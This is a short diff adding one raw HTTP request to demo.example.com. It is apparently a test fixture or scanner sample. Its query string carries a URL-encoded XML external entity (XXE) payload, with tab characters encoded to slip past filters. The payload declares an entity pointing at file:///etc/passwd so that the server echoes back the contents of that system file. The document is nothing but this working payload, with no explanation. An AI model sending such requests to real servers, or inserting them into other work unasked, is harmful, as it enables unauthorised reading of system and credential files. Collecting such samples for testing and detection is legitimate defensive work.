@@ -1,0 +1,4 @@
+GET /a?q=<%3Fxml%09version%3D"1.0"%3F><!DOCTYPE%09r%09[<!ENTITY%09x%09SYSTEM%09"file:///etc/passwd">]><r>%26x;</r> HTTP/1.1
+Host: demo.example.com
+Connection: close
+
